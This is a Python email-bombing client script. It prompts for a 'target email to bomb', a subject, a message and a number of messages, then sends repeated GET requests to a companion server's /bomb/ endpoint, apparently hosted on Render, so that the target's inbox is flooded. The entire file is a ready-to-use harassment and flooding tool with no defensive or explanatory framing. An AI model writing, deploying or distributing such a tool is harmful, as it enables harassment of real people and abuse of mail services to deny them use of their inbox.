import requests
import random
import time

# Configuration - Update after deployment
BASE_URL = "http://localhost:5000"  # Change to https://your-app-name.onrender.com
DELAY_BETWEEN_SENDS = 1

# Collect user inputs
to = input("Enter target email to bomb: ")
sub = input("Enter subject: ")
msg = input("Enter message: ")

# URL encode special characters
def url_encode(text):
    replacements = {
        '$': '%24', '&': '%26', '+': '%2B', ',': '%2C',
        '/': '%2F', ':': '%3A', ';': '%3B', '=': '%3D',
        '?': '%3F', '@': '%40'
    }
    for char, encoded in replacements.items():
        text = text.replace(char, encoded)
    return text

sub_encoded = url_encode(sub)
msg_encoded = url_encode(msg)

# Get number of messages
try:
    am = int(input("Enter amount of messages to send: "))
except ValueError:
    print("Error: Please enter a valid number.")
    exit(1)

# Send messages
successful_sends = 0
for i in range(am):
    url = f"{BASE_URL}/bomb/{to}/{sub_encoded}/{msg_encoded}"
    try:
        req = requests.get(url, timeout=10)
        if req.text.strip() == "Sent":
            print(f"Message {i+1} sent successfully")
            successful_sends += 1
        else:
            print(f"Failed to send message {i+1}. Server response: {req.text} (Status: {req.status_code})")
            break
        time.sleep(DELAY_BETWEEN_SENDS)
    except requests.RequestException as e:
        print(f"Error sending message {i+1}: {e}")
        break

print(f"\nBomber complete. {successful_sends}/{am} messages sent.")
